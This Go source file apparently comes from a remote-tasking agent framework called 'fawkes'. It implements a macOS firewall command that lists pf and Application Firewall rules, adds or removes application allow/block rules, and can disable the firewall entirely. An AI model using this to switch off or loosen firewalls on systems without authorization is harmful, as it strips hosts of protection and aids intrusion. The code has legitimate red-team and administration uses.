//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

const socketFilterFW = "/usr/libexec/ApplicationFirewall/socketfilterfw"

type FirewallCommand struct{}

func (c *FirewallCommand) Name() string        { return "firewall" }
func (c *FirewallCommand) Description() string { return "Manage macOS firewall (pf/ALF)" }

func (c *FirewallCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: list, add, delete, enable, disable, status",
			Status:    "error",
			Completed: true,
		}
	}

	var args firewallArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return darwinFirewallList()
	case "status":
		return darwinFirewallStatus()
	case "add":
		return darwinFirewallAdd(args)
	case "delete":
		return darwinFirewallDelete(args)
	case "enable":
		return darwinFirewallEnable(true)
	case "disable":
		return darwinFirewallEnable(false)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: list, add, delete, enable, disable, status", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func darwinFirewallStatus() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== macOS Firewall Status ===\n\n")

	// Check Application Layer Firewall (ALF) via socketfilterfw
	alfOut, err := execCmdTimeout(socketFilterFW, "--getglobalstate")
	if err == nil {
		sb.WriteString("Application Firewall (ALF):\n")
		sb.WriteString("  " + strings.TrimSpace(string(alfOut)) + "\n")
	}

	// Check stealth mode
	stealthOut, err := execCmdTimeout(socketFilterFW, "--getstealthmode")
	if err == nil {
		sb.WriteString("  " + strings.TrimSpace(string(stealthOut)) + "\n")
	}

	// Check block-all mode
	blockOut, err := execCmdTimeout(socketFilterFW, "--getblockall")
	if err == nil {
		sb.WriteString("  " + strings.TrimSpace(string(blockOut)) + "\n")
	}

	sb.WriteString("\n")

	// Check PF (packet filter) status
	pfOut, err := execCmdTimeout("pfctl", "-s", "info")
	if err == nil {
		sb.WriteString("Packet Filter (pf):\n")
		for _, line := range strings.Split(string(pfOut), "\n") {
			trimmed := strings.TrimSpace(line)
			if trimmed == "" {
				continue
			}
			if strings.HasPrefix(trimmed, "Status:") || strings.HasPrefix(trimmed, "State Table") ||
				strings.Contains(trimmed, "current entries") {
				sb.WriteString("  " + trimmed + "\n")
			}
		}
	} else {
		sb.WriteString("Packet Filter (pf): not accessible (requires root)\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// darwinFirewallEnable enables or disables the Application Layer Firewall.
func darwinFirewallEnable(enable bool) structs.CommandResult {
	state := "off"
	label := "Disabled"
	if enable {
		state = "on"
		label = "Enabled"
	}

	out, err := execCmdTimeout(socketFilterFW, "--setglobalstate", state)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error setting firewall state: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("%s macOS Application Firewall\n%s", label, strings.TrimSpace(string(out))),
		Status:    "success",
		Completed: true,
	}
}

// darwinFirewallAdd adds an application to the ALF and sets its allow/block policy.
func darwinFirewallAdd(args firewallArgs) structs.CommandResult {
	if args.Program == "" {
		return structs.CommandResult{
			Output:    "Error: program path is required for add action",
			Status:    "error",
			Completed: true,
		}
	}

	// Add the application to the firewall
	out, err := execCmdTimeout(socketFilterFW, "--add", args.Program)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error adding application: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Added: %s\n", strings.TrimSpace(string(out))))

	// Set allow/block policy (default: allow)
	if strings.EqualFold(args.RuleAction, "block") {
		blockOut, err := execCmdTimeout(socketFilterFW, "--blockapp", args.Program)
		if err != nil {
			sb.WriteString(fmt.Sprintf("Warning: failed to set block policy: %v\n%s", err, string(blockOut)))
		} else {
			sb.WriteString(fmt.Sprintf("Policy: %s\n", strings.TrimSpace(string(blockOut))))
		}
	} else {
		allowOut, err := execCmdTimeout(socketFilterFW, "--unblockapp", args.Program)
		if err != nil {
			sb.WriteString(fmt.Sprintf("Warning: failed to set allow policy: %v\n%s", err, string(allowOut)))
		} else {
			sb.WriteString(fmt.Sprintf("Policy: %s\n", strings.TrimSpace(string(allowOut))))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// darwinFirewallDelete removes an application from the ALF.
func darwinFirewallDelete(args firewallArgs) structs.CommandResult {
	if args.Program == "" {
		return structs.CommandResult{
			Output:    "Error: program path is required for delete action",
			Status:    "error",
			Completed: true,
		}
	}

	out, err := execCmdTimeout(socketFilterFW, "--remove", args.Program)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing application: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed: %s", strings.TrimSpace(string(out))),
		Status:    "success",
		Completed: true,
	}
}

func darwinFirewallList() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== macOS Firewall Rules ===\n\n")

	// List ALF application rules
	alfOut, err := execCmdTimeout(socketFilterFW, "--listapps")
	if err == nil {
		sb.WriteString("--- Application Firewall Rules ---\n")
		sb.WriteString(strings.TrimSpace(string(alfOut)))
		sb.WriteString("\n\n")
	}

	// List PF rules
	pfOut, err := execCmdTimeout("pfctl", "-s", "rules")
	if err == nil {
		output := strings.TrimSpace(string(pfOut))
		if output != "" {
			sb.WriteString("--- Packet Filter Rules ---\n")
			sb.WriteString(output)
			sb.WriteString("\n\n")
		}
	}

	// List PF NAT rules
	natOut, err := execCmdTimeout("pfctl", "-s", "nat")
	if err == nil {
		output := strings.TrimSpace(string(natOut))
		if output != "" {
			sb.WriteString("--- PF NAT Rules ---\n")
			sb.WriteString(output)
			sb.WriteString("\n")
		}
	}

	if sb.Len() < 50 {
		sb.WriteString("No firewall rules found or insufficient privileges.\nRun as root for full pf rule listing.\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
